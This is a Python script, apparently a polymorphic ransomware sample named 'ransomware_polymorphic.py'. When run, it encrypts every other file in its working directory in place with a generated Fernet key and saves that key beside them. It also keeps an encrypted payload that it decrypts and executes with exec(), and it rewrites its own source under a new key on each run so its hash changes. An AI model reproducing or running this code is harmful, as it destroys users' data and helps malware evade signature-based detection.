import inspect
import os
from cryptography.fernet import Fernet
import hashlib


# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)

   return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)


# START
key = "YU1spp0Tgnp7z0sNgXJZ6TsBlyJq8JxVARHZFZF_iVs="
token = "gAAAAABnMm_t56U7JN-UJC88GIBpfeXwPtsVCwYVXUl-6B-uByJvI_bgFmbzGpLapft8Fu4J8Avokqc46UjHXTHv2vz1Ix_ctEm9QnraB0v8DhKP0oUxzdpK8usUpPie6A-4KwBdTbAD0Fitb8gu0izji2SeAhgKJUxSOSFOBjgI9npyrejh_796whF3mgOTnQzvZHyKkZwpcKTlvYnhCW53SqwxDZbtbHOY0RfRjIYpzM-sV-p1v-crNWHFT_WOHDsUVZVnOqODdcA_Z7lT8qz7yFyB8S0tn9IECiM593cYG79Tttmz75NyUDkObipIV53CPgkY23AAIqsPXQnjsXL8rK_bqmjX1-eOafoDuOZt6Tywql_3F_K3KvAQj18Wv2B8KNQYND-VkaMKfPnLjm4cdX-e8XENrOtr-sVREVDSGDr9TpGdDaYllVqhma2xOtIgI1OhEId02dPFYJW1p7Pzon2pz4CRMPA7NjtqBn-E2u-ijC_7pLa5OBV2DnubSxJ-53CqzWCeoKsQEiVKAZcYEkOaxQU22KLkDWYF8_QIOr7XC0wZWi0EOPx5FrZ--stSAtKtsosebLHUMASqgPSUw_-ixtOxfsBJX5IfTm1vQIL5OiBHA1vMCA2qAvXqagC1E69Gj7N1ymrnwTxp_Y-Au4_8A7wdVSZ9gYGQfCHRvrNip8DErC8GKEH79QnyCW7MTWxyH_-AFfeSIX-qwXjz9sTwYSMILqj5EetEAgvVOpmgCUGZfHUMvP6pQs0hry6QF2ZZnDp_HmZVOn3KRvxGm_eKHjQhdI7AGjPj-r58uze2X2kH99dpb-YDusVY8Cw99h-bFe5BfrOjCHmHnZkooqekvyMCpxs3zI_tIe6QN3B8qwb4viATBsv-TxgwhODBDgi1TNXHkeCv6kMjMWS2hGFCWQ0hKneW1n89bUgZNzVAzC6V7z_e2djDmcJLqdDbcPFd-K4Cs-wYUPfnGOtyxpDCuLBlnE18i2wBTaXa-wfL5eXkjOOCm5KJtiUCQaa54REgvL3UEOYe7OtvbpfD52rk4zXfcinWZ9wZ-XYNngqBU-9ejYzjjb-Oca8LVo0Q1L4M6S-e_axm6uXvYe7m3WvlSP4VFl68oRxg2sVXg8eMGICuZC3If9OjgVXzL9qf6BfiHqVC5gr-mhLc3o8BCmf-g_RNCrlaATj3t9BsmQjHbeIjPnBAsHI81dt6mdDf6cIZY2gXhaikNBcZXHk299pkcHWjYLa2oML4BmII6qH1x7QvQFWeY8d5v9DECpIYjSq5C-bmt-h8ky_ANjQC2pP0elVFhaVfBIKTIRbsBN_hvfDZY4XJO22K8omMuANOuPGNWjiFXO5owdtTCI4O9WRxeD4hagqiNGeORS_avXRZgAi3rAaCG8HdcSHysSQFo_ot0acn-pW0QdaQ-6GdTgmE_RHz6Cwhx9LYvSk3T-f5iQo1CW6YdLb7f1BG_AF7PTVy4mPvA-EJ_BayODxWSx0gukKS1NqMKWpK6ov25nJH1GwjCp607PcK8m430WJPQkNYWx8T05SxKyHp-xw0eqR7wVPzsGSvi7ZPmSvVPj9O67W8IVdR1hgD1MFqcmlgWXRu5USv26kX487PRbLHp7c7Su3VaOXXcym1JkH_D6v2MIPkH2ilRSqfz1yK_zuUeCQU7PAWJpaeFdVsr1Hi5D0WDQbEzr2M0ICpPip9ddH6w91LNEobJB3nFC9ZDeyJUmuAfkbT_l1qzXPon5LG58Yeg9zgYFrVcIR4sxuClARBZE6tV-0BepU4e0UBrU9t6-1j_CkFePOrMkzypViFo8WJLpCCtcWhrgZMrLMYNomOuZB3PC7Vhc87g2PJ7C7uSf6R1dh1lkZALh_oAfpMpi6YMbPjMlAXNl1FqxR3jQoVF_5v06K972-LpMNDaeOClZcjO30maQCrPxAfW-uSIJPVNYrQFx-aEzY-VfwcwC8D1W02YgM="

def run():
    files = []

    for file in os.listdir():
        if file == "ransomware_polymorphic.py" or file == "thekey.key" or file == "ransomware_polymorphic.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    key1 = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key1)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key1).encrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_encrypted)

    fname = os.path.basename(__file__)
    lines = []
    with open(fname, 'r') as f:
        lines = f.readlines()
    
    with open('lol', 'w') as f:
        for line in lines:
            if line.startswith("# START"):
                break
            f.write(line)

        f.write("# START\n")
        global key
        global token

        fer = Fernet(key)
        virus = fer.decrypt(token).decode()

        key = Fernet.generate_key()
        fer = Fernet(key)
        token = fer.encrypt(virus.encode())
    
        f.write("key = \"{}\"\n".format(key.decode()))
        f.write("token = \"{}\"\n".format(token.decode()))
        f.write("\ndecrypt(token, key)\n")
    
    os.remove(fname)
    os.rename("lol", fname)


run()